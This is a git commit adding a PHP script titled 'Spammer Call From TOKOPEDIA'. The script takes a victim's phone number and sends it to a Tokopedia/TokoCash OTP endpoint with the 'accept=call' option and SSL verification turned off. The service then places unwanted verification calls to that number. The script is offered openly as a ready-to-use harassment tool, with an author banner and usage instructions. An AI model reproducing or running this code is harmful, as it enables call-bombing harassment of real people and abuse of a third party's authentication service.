758dc5abcd54d3d3908ecd5f2c3039bffc5764f4
mousecyber-sec <53597227+mousecyber-sec@users.noreply.github.com>
2019-08-02 14:00:54 +0700

    Add files via upload

---
+++ call.php
@@ -0,0 +1,28 @@
+<?php
+// Limit 3x Telpon Setiap Satu Nomor
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
+        curl_close($ch);
+                echo $asw."\n";
+}
+echo "
+############################################################
+    Spammer Call From TOKOPEDIA
+    Mod By      : Acep X-Code
+    Contact Me  : acepxcode@gmail.com
+    Blog        : www.acepx-code.zone.id
+    Github      : https://github.com/mousecyber-sec
+    Thanks to   : Mouse Cyber Security
+    Penggunaan  : Awali Dengan Angka [62]
+############################################################\n";
+echo "Nomor\nInput : ";
+$nomor = trim(fgets(STDIN));
+$execute = send($nomor);
+print $execute;
+?>
